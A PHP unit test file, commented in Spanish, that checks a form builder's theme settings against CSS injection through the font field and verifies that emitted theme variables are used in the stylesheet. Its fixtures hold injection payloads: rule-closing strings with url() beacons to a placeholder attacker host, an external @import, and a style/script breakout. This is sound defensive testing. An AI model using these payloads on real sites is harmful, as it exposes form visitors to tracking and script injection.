<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Services\FormSettings;

/**
 * Fase 2, item 2.8 — inyección de CSS por `settings.theme.font`.
 *
 * El valor de la tipografía va directo a un `font-family` dentro de un `<style>`
 * que carga el **fill público**, o sea sin sesión ni CSRF. Y la validación que
 * había era la de los colores: los colores se comprueban con
 * `^#[0-9a-f]{3,8}$`, el font no se comprobaba en absoluto. Con eso, guardar
 * como tipografía `Arial; } body{background:url(//atacante/leer?x)` añadía
 * declaraciones CSS nuevas en la página de todos los visitantes del formulario.
 *
 * Lo que se mide aquí:
 *
 *  - `isValidFontFamily()` es lista blanca: acepta lo que se puede escribir en
 *    un `font-family` y rechaza comillas, paréntesis, `;`, llaves, barra,
 *    dos puntos y `<`, o sea `url(`, `@import` y el cierre de la declaración.
 *  - El corte está en las DOS puertas. En `normalize()` (todo lo que llega del
 *    builder o de un POST de settings) y en `themeCss()` al emitir, que es la
 *    que de verdad importa: puede haber filas en `forms.settings` guardadas
 *    antes de que existiera el patrón, y filtrar solo al guardar no las limpia.
 *  - `validate()` mira el valor CRUDO. Si mirara el normalizado nunca vería un
 *    valor inválido (ya viene en null) y quien escribe la tipografía se
 *    quedaría sin ningún aviso de que se le descartó en silencio.
 */
class ThemeFontCssInjectionTest
{
    /** @return string[] */
    private function tipografiasInvalidas(): array
    {
        return [
            'cierre de regla y beacon' => 'Arial; } body{background:url(//atacante.test/leer?a=1)',
            'url() directo'              => 'url(//atacante.test/leer?b=1)',
            'importacion externa'        => '@import url("//atacante.test/x.css")',
            'comilla doble'              => 'Arial"; } #x{color:red',
            'comilla simple'             => "Arial'; } #x{color:red",
            'cierre de script'           => 'arial}</style><script>alert(1)</script>',
            'llave suelta'               => 'Arial}',
            'punto y coma'               => 'Arial;',
            'parentesis'                 => 'Arial(1)',
            'barra invertida'            => 'Arial\\',
            'dos puntos'                 => 'Arial:red',
            'asterisco'                  => 'Arial*',
            'asterisco importante'       => 'Arial !important',
            'punto y coma al inicio'     => ';Arial',
        ];
    }

    public function testIsValidFontFamilyEsListaBlanca(): void
    {
        foreach ($this->tipografiasInvalidas() as $caso => $valor) {
            assertFalse(
                FormSettings::isValidFontFamily($valor),
                'debe rechazar (' . $caso . '): ' . $valor
            );
        }
    }

    public function testAceptaLasFamiliasQueDeVerSonLegitimas(): void
    {
        $buenas = [
            'Inter',
            'Georgia',
            'Source Sans 3',
            'Inter, sans-serif',
            'Helvetica, Arial, sans-serif',
            'Fira_Condensed-Bold',
            'Open Sans',
            'Arial',
        ];
        foreach ($buenas as $f) {
            assertTrue(FormSettings::isValidFontFamily($f), 'debe aceptar: ' . $f);
        }
    }

    /**
     * Primera puerta: lo que llega del builder o de un POST de settings se
     * descarta al normalizar, así que ni llega a guardarse.
     */
    public function testNormalizeDescartaLaTipografiaInvalida(): void
    {
        foreach ($this->tipografiasInvalidas() as $caso => $valor) {
            $n = FormSettings::normalize(['theme' => ['font' => $valor]]);
            assertNull(
                $n['theme']['font'],
                'normalize debe dejar la tipografía en null (' . $caso . '): ' . $valor
            );
        }
    }

    /**
     * Segunda puerta, y la que de verdad protege: una fila ya guardada con un
     * font inválido (de antes del arreglo) NO debe producir CSS. Aquí el
     * settings NO pasa por normalize, va tal cual, como lo leería el fill.
     */
    public function testThemeCssIgnoraLaTipografiaInvalidaDeUnaFilaVieja(): void
    {
        foreach ($this->tipografiasInvalidas() as $caso => $valor) {
            $css = FormSettings::themeCss(['theme' => ['font' => $valor]]);
            assertEquals('', $css, 'una fila con font inválido no debe emitir CSS (' . $caso . ')');
        }
    }

    /**
     * El filtro no puede comerse el resto del tema: si el font es inválido, los
     * colores válidos se siguen emitiendo (o sea, se descarta la variable, no
     * el tema entero, que sería un fallo distinto y más silencioso).
     */
    public function testUnFontInvalidoNoArrastraLosColoresValidos(): void
    {
        $css = FormSettings::themeCss([
            'theme' => [
                'primary'    => '#3366ff',
                'background' => '#ffffff',
                'font'       => 'Arial; } body{background:url(//atacante.test/x)',
            ],
        ]);

        self::assertStringContains('--vf-primary:#3366ff', $css);
        self::assertStringContains('--vf-background:#ffffff', $css);
        assertFalse(str_contains($css, '--vf-font'), 'la variable de la fuente no se emite');
        assertFalse(str_contains($css, 'atacante'), 'no puede colarse nada del payload');
        // Una llave de cada: la que abre :root y la que lo cierra. El payload
        // traía dos de cierre, y con la segunda el CSS se salía del :root.
        assertSame(1, substr_count($css, '{'), 'solo la llave que abre :root');
        assertSame(1, substr_count($css, '}'), 'solo la llave que cierra :root');
    }

    /**
     * El espacio alrededor sí se tolera, porque `normalize()` recorta antes de
     * validar y quien lo escribe en el formulario se encuentra con los espacios
     * pegados de cualquier forma. Se fija el comportamiento para que nadie lo
     * lea como un agujero: el recorte va ANTES del patrón.
     */
    public function testElEspacioAlrededorSeRecortaYNoEsUnError(): void
    {
        $n = FormSettings::normalize(['theme' => ['font' => '  Inter  ']]);
        assertSame('Inter', $n['theme']['font'], 'los espacios de los extremos se recortan');
        assertNull(FormSettings::validate(['theme' => ['font' => '  Inter  ']]), 'y no es un error de validación');
    }

    public function testThemeCssEmiteLaTipografiaLegitimaSinComillas(): void
    {
        $css = FormSettings::themeCss(FormSettings::normalize([
            'theme' => ['font' => 'Source Sans 3, sans-serif'],
        ]));

        // Sin comillas: no hacen falta (una familia con espacios es CSS válido)
        // y el htmlspecialchars previo las convertía en &quot;, que dentro de
        // un <style> no se decodifica, o sea un nombre de fuente roto.
        self::assertStringContains('--vf-font:Source Sans 3, sans-serif', $css);
        assertFalse(str_contains($css, '&quot;'), 'no debe quedar ninguna entidad en el CSS');
    }

    /**
     * `validate()` tiene que avisar, no fallar en silencio: si solo mirara el
     * valor normalizado (que ya viene en null) nunca devolvería este error y
     * quien escribe la tipografía no sabría por qué no se guardó.
     */
    public function testValidateAvisaDeLaTipografiaInvalida(): void
    {
        foreach (['Arial; } body{x:url(//e)', 'url(//atacante.test/x)', 'Arial"x'] as $caso) {
            $msg = FormSettings::validate(['theme' => ['font' => $caso]]);
            assertNotNull($msg, 'validate debe avisar del valor inválido: ' . $caso);
        }

        assertNull(FormSettings::validate(['theme' => ['font' => 'Inter']]), 'una tipografía válida no da error');
        assertNull(FormSettings::validate(['theme' => ['font' => '']]), 'vacía no es un error');
    }

    /**
     * El recorte de normalize() es de 40 caracteres y el patrón admite 120: una
     * tipografía larga pero legítima debe sobrevivir. Se fija porque si el
     * patrón fuera más corto que el recorte, `validate()` (que valida el valor
     * recortado) y `normalize()` (que recorta) discreparían.
     */
    public function testElPatronAdmiteLoQueElRecorteDeja(): void
    {
        $larga = str_repeat('Ab', 30); // 60 caracteres
        assertTrue(FormSettings::isValidFontFamily($larga), 'el patrón debe admitir la longitud que deja normalize()');
    }

    /**
 * La otra mitad del tema: lo que `themeCss()` EMITE tiene que LEERSE.
 *
 * Este archivo nació por la puerta de entrada, y mientras miraba esa puerta
 * apareció el otro fallo, del mismo género y bastante más tonto: «Color de
 * fondo» y «Fuente» se guardaban, se validaban y se emitían como
 * `--vf-background` y `--vf-font`, y en `app.css` esas dos variables NO
 * aparecían ni una vez. De los tres ajustes de «Diseño» solo funcionaba el
 * color principal. El color de página era un gradiente escrito a mano dos
 * veces en el archivo (la segunda ganaba por orden y la primera era código
 * muerto) y la fuente la ponía `body` a pelo.
 *
 * Un ajuste que se guarda bien y no se ve no da ningún error, que es
 * exactamente por lo que hace falta el test: que toda variable que el tema
 * emite tenga un consumidor, para que la próxima no pase en silencio.
 */
    public function testTodaVariableDelTemaTieneUnConsumidorEnElCss(): void
    {
        $css = (string) file_get_contents(dirname(__DIR__, 2) . '/public/assets/css/app.css');

        $emitido = FormSettings::themeCss(FormSettings::normalize([
            'theme' => ['primary' => '#123456', 'background' => '#fedcba', 'font' => 'Georgia, serif'],
        ]));
        preg_match_all('/(--vf-[a-z-]+)\s*:/', $emitido, $m);
        $variables = array_values(array_unique($m[1]));

        assertTrue($variables !== [], 'el tema debe emitir variables: ' . $emitido);

        $huerfanas = [];
        foreach ($variables as $v) {
            if (!str_contains($css, 'var(' . $v)) {
                $huerfanas[] = $v;
            }
        }
        assertTrue(
            $huerfanas === [],
            'estas variables las emite themeCss() y no las lee nadie en app.css, así que el ajuste se '
                . 'guarda y no se aplica: ' . implode(', ', $huerfanas)
        );
    }

/**
 * Y que la del fondo se aplique al fondo de la PÁGINA, no a la tarjeta: con un
 * color oscuro de fondo, la tarjeta en blanco es lo que mantiene legible el
 * formulario.
 */
    public function testElColorDeFondoSeAplicaAlFondoDeLaPaginaYLaTarjetaSigueBlanca(): void
    {
        $css = (string) file_get_contents(dirname(__DIR__, 2) . '/public/assets/css/app.css');
        assertTrue(
            preg_match('/\.fill-body\s*\{[^}]*background:\s*var\(--vf-background\)/s', $css) === 1,
            '.fill-body tiene que tomar --vf-background: es el «fondo de la página del formulario» que promete el control'
        );
        assertTrue(
            preg_match('/\.app-fill-card \.card-body\s*\{[^}]*background:\s*#fff/s', $css) === 1,
            'la tarjeta del formulario se queda en blanco'
        );
    }

    private function assertStringContains(string $needle, string $haystack): void
    {
        assertTrue(
            str_contains($haystack, $needle),
            'se esperaba que ' . var_export($needle, true) . ' estuviera en ' . var_export($haystack, true)
        );
    }
}
